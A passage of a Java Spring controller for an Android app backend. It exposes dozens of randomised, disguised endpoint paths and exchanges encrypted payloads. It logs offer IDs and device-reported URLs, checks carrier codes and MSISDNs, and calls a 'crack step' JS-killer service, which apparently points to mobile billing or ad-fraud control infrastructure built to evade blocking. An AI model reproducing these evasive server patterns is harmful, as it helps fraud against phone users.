                errorMessage = formatErrorMessage(ResponseInfoEnum.DESC_DECODE_ERROR.getCode(), ResponseInfoEnum.DESC_DECODE_ERROR.getMsg());
                return errorMessage;
            }
        } else {
            errorMessage = formatErrorMessage(ResponseInfoEnum.NULL_ALEX_REQUEST_BODY.getCode(), ResponseInfoEnum.NULL_ALEX_REQUEST_BODY.getMsg());
        }
        return errorMessage;
    }

    /**
     * format错误信息
     *
     * @param code
     * @param msg
     * @return
     */
    private String formatErrorMessage(Integer code, String msg) {
        Map<String, Object> errorMessage = new HashMap<>(1);
        errorMessage.put("code", code);
        errorMessage.put("msg", msg);
        return JSON.toJSONString(errorMessage);
    }

    /**
     * 打点及保存日志
     * HTTP_SEND_LOG
     *
     * @param request
     * @param msg
     * @return
     * @throws Exception
     */
    @Timed
    @CrossOrigin(origins = "*", maxAge = 3600)
    @RequestMapping(value = {"/cua/0shb3", "/tsh/xnuso", "/teh/jdif3", "/ysh/cj5id", "/ueg/bvd2p", "/tdj/dnu6x", "/ejf/djk4s", "/udn/io8fn", "/dui/powqm", "/duq/dj5io", "/ydj/ci6od", "/ynf/vi4f1", "/bsd/h76bq", "/o2b/zi3ob", "/xji/3njsf", "/ybd/dj3la", "/cys/hs83i", "/tnm/sd25z", "/2hu/shome", "/H9n/BJM7n", "/vks/bsn3T", "/h4k/xnL2k", "/vbn/rjvSk", "/ght/gbhJ6", "/lgk/bs2Jk", "/N2n/dfs9B", "/jtv/cxtGk", "/dso/das2I", "/ejg/UIonw", "/psh/bntD5", "/kgd/mfv4H", "/gbj/btjh1", "/drx/dxeft", "/lkt/nvbTm", "/x4m/H2klj", "/b2t/vjgTs"}, method = {RequestMethod.POST, RequestMethod.GET})
    @ResponseBody
    public String httpLog(HttpServletRequest request, @RequestBody(required = false) String msg) throws Exception {
        DesUtil desUtil = AndroidGroupGetDesConfig.getDes(request);
        try {
            String ipAddress = IpUtil.getIpAddr(request);
            if (StringUtils.isEmpty(msg) || StringUtils.isEmpty(desUtil.decode(msg))) {
                String errorMessage = formatErrorMessage(ResponseInfoEnum.SEND_EVENT_CODE_NULL.getCode(), ResponseInfoEnum.SEND_EVENT_CODE_NULL.getMsg());
                log.info("HTTP_SEND_LOG NULL ,URL:{}", request.getRequestURL());
                return ResponseInfoUtil.errorMsg(errorMessage, desUtil);
            }
            JSONObject json = JSONObject.parseObject(desUtil.decode(msg));
            String appId = json.getString("ap");
            String userId = json.getString("userId");
            String offerId = json.getString("of");
            Long timestamp = json.getLong("ttl");
            String operator = mncService.generateOp(json.getString("op"));
            String url = json.getString("url");
            String body = json.getString("body");
            String pid = json.getString("pid");
            Integer status = json.getInteger("status");
            logService.saveLog(appId, offerId, null, pid, url, operator, body, timestamp, ipAddress, status, userId);
            String successMessage = formatErrorMessage(ResponseInfoEnum.SUCCESS.getCode(), ResponseInfoEnum.SUCCESS.getMsg());
            return ResponseInfoUtil.success(successMessage, desUtil);
        } catch (Exception e) {
            log.info("analysis error:{}, message:{}", e.getMessage(), e);
            // 出错时仍然保存日志
            String errorMessage = formatErrorMessage(ResponseInfoEnum.DESC_DECODE_ERROR.getCode(), ResponseInfoEnum.DESC_DECODE_ERROR.getMsg());
            return ResponseInfoUtil.errorMsg(errorMessage, desUtil);
        }
    }

    /**
     * CHECK_FB
     *
     * @param request
     * @param body
     * @return
     * @throws Exception
     */
    @SuppressFBWarnings("RCN_REDUNDANT_NULLCHECK_WOULD_HAVE_BEEN_A_NPE")
    @CrossOrigin(origins = "*", maxAge = 3600)
    @RequestMapping(value = {"/guc/7ksdp", "/s3d/ndswm", "/sbu/fbu7x", "/dfu/ds65s", "/cyq/cdu62", "/cbu/djh72", "/wui/fn3jl", "/J2K/Hjk2n", "/xJr/sxjH2", "/mzc/vnb2K", "/avh/tj2Kr", "/g7f/gjbVr", "/lot/gkbs5", "/X2K/SDh2l", "/xcu/bvu5j", "/vgT/jgvFr", "/bkg/poBn4", "/kfs/bkgoT", "/skg/g2kwi", "/hbT/jHskT", "/cgk/jskgT", "/pwm/nlKn2"}, method = {RequestMethod.POST, RequestMethod.GET})
    @ResponseBody
    public String checkMnc(HttpServletRequest request, @RequestBody String body) throws Exception {
        DesUtil desUtil = AndroidGroupGetDesConfig.getDes(request);
        String param = desUtil.decode(body);
        String result = mncService.findMncResult(param);
        return ResponseInfoUtil.success(result, desUtil);
    }

    /**
     * CHECK MSISDN
     *
     * @param request
     * @param body
     * @return
     * @throws Exception
     */
    @SuppressFBWarnings("RCN_REDUNDANT_NULLCHECK_WOULD_HAVE_BEEN_A_NPE")
    @CrossOrigin(origins = "*", maxAge = 3600)
    @RequestMapping(value = {"/bus/n5uks", "/x5s/dbski", "/bnj/9hjew", "/ush/37j8n", "/yxa/sdj21", "/ddw/dshuj", "/vui/zioea", "/bkt/xjvF8", "/cvs/arn2t", "/op2/f2JNK", "/vkg/xjvF8", "/ogs/vtj8A", "/vjt/7fjkS", "/wl2/qwo3j ", "/yrn/jk23g", "/eqr/fkjYs", "/dfg/wpoTj", "/dwg/vjfdk", "/bgo/xmjTs", "/xns/3kfYs", "/pfh/ugsTj", "/L6k/fdJ2S"}, method = {RequestMethod.POST, RequestMethod.GET})
    @ResponseBody
    public String checkMsisdnRegex(HttpServletRequest request, @RequestBody String body) throws Exception {
        DesUtil desUtil = AndroidGroupGetDesConfig.getDes(request);
        String param = desUtil.decode(body);
        String result = mncService.findMncResult(param);
        return ResponseInfoUtil.success(result, desUtil);
    }

    /**
     * check permission
     *
     * @param request
     * @param body
     * @return
     * @throws Exception
     */
    @SuppressFBWarnings("RCN_REDUNDANT_NULLCHECK_WOULD_HAVE_BEEN_A_NPE")
    @CrossOrigin(origins = "*", maxAge = 3600)
    @RequestMapping(value = {"/poi/dnxja", "/cu9/sh6dj", "/ywh/u6bdm", "/jsd/bcy8s", "/xua/sd7ty", "/whj/uisdn", "/diu/buc7e", "/jid/du6yo", "/dyd/dui3c", "/ab3/ig2mu", "/bql/wbj82", "/zio/mk2la", "/cdu/si2hd", "/yus/cbh23", "/bus/cdu56", "/smo/7b92h", "/jk2/HIn2i", "/cyb/df23j", "/qwz/waQzt", "/mxs/hbTks", "/mev/esA6z", "/sgk/nbg4T", "/BHJ/nj32l", "/bvn/tiOpn", "/jws/PvnTk", "/skt/Pgjk", "/lhj/bjg2v", "/sfg/gjtPn", "/xbs/kbvTk", "/cke/k32NK"}, method = {RequestMethod.POST, RequestMethod.GET})
    @ResponseBody
    public String checkPermissionRegex(HttpServletRequest request, @RequestBody String body) throws Exception {
        DesUtil desUtil = AndroidGroupGetDesConfig.getDes(request);
        String param = desUtil.decode(body);
        String result = mncService.findMncResult(param);
        return ResponseInfoUtil.success(result, desUtil);
    }

    /**
     * check app status
     *
     * @param request
     * @param body
     * @return
     * @throws Exception
     */
    @Timed
    @SuppressFBWarnings("RCN_REDUNDANT_NULLCHECK_WOULD_HAVE_BEEN_A_NPE")
    @CrossOrigin(origins = "*", maxAge = 3600)
    @RequestMapping(value = {"/4dz/khhha","/00b/ggs23","/nas/ldgh2","/cv8/uvpd2","/kjh/qwerx","/vcx/bvcza", "/fd0/z354b","/3gh/jh723","/dum/ue73g", "/tak/bcyui", "/ysh/sdhub", "/uxn/sdij4", "/cyd/dfuix","/k7j/gh971","/pla/7945a","/sv0/lpf3f", "/dyu/uebm7", "/tss/su4yw", "/psh/und4d", "/ndc/df6ji","/gt6/4567f", "/dun/if4dn", "/ern/icpsb", "/sd8/dhu2i", "/cdb/d52hv","/e89/564fe","/cvn/mnm38","/43g/h53gi", "/dty/ci9fj", "/wkv/fjg7r", "/gyu/bnu3g", "/bus/civbe", "/zbu/hij2q", "/yui/cdi78", "/xcu/dak23", "/u7a/cbhyd", "/cyw/ni27b", "/cjt/jvgvt", "/gks/tkwoN", "/ion/h3k2M", "/ON1/Dd3jk", "/hvc/vjs2T", "/vco/io45b", "/I2k/Nkdfs"}, method = {RequestMethod.POST, RequestMethod.GET})
    @ResponseBody
    public String checkAppStatus(HttpServletRequest request, @RequestBody String body) throws Exception {
        DesUtil desUtil = AndroidGroupGetDesConfig.getDes(request);
        String param = desUtil.decode(body);
        JSONObject paramJson = JSON.parseObject(param);
        JSONObject appResult = mncService.findAppStatus(String.valueOf(paramJson.get("appId")));
        String result = mncService.findMncResult(String.valueOf(paramJson.get("mnc")));
        JSONObject resultJson = JSON.parseObject(result);
        resultJson.put("adsStatus", appResult.getInteger("adsStatus"));
        resultJson.put("logStatus", Integer.parseInt(appResult.getString("logStatus")));
        resultJson.put("fbId", appResult.getString("fbId"));
        String finalResult = JSON.toJSONString(resultJson);
        return ResponseInfoUtil.success(finalResult, desUtil);
    }

    /**
     * new check app status
     * @param request
     * @param body
     * @return byte[]
     * @author Curry
     * @date 2022/11/1
     */
    @Timed
    @SuppressFBWarnings({"RCN_REDUNDANT_NULLCHECK_WOULD_HAVE_BEEN_A_NPE", "DM_DEFAULT_ENCODING"})
    @CrossOrigin(origins = "*", maxAge = 3600)
    @RequestMapping(value = {"/cparam", "/gargum","/cabsolutely", "/gaccuse", "/cactor", "/gadjustment", "/cadventure", "/gagain", "/caircraft", "/galso",
            "/cancient", "/ganybody", "/csappearance", "/garchitect", "/carrival", "/cassess", "/gassure", "/cattractive", "/caway", "/cband", "/cbasketball",
    "/gbedroom", "/gbelow", "/gcampus", "/ccare", "/ccelebrate"})
    @ResponseBody
    public byte[] checkAppStatusNew(HttpServletRequest request, @RequestBody byte[] body) throws Exception {
        AesUtil desUtil = AndroidGroupGetAesConfig.getAes(request);
        int encodeType = 1;
        if (request.getRequestURI().indexOf(ZooConstant.SPLIT_C) == -1) {
            encodeType = 2;
        }
        String param = new String(desUtil.decode(body, encodeType));
        JSONObject paramJson = JSON.parseObject(param);
        JSONObject appResult = mncService.findAppStatus(String.valueOf(paramJson.get("appId")));
        String result = mncService.findMncResult(String.valueOf(paramJson.get("mnc")));
        JSONObject resultJson = JSON.parseObject(result);
        resultJson.put("adsStatus", appResult.getInteger("adsStatus"));
        resultJson.put("logStatus", Integer.parseInt(appResult.getString("logStatus")));
        resultJson.put("fbId", appResult.getString("fbId"));
        String finalResult = JSON.toJSONString(resultJson);
        return ResponseInfoUtil.successByte(finalResult, desUtil, encodeType);
    }


    @PostMapping(value = "/za/test/jskiller")
    @ResponseBody
    public String testJskiller(@RequestParam Map<String, String> params) throws Exception {
        return ResponseInfoUtil.successWithoutDesc(crackStepService.testJsKiller(params));
    }
}
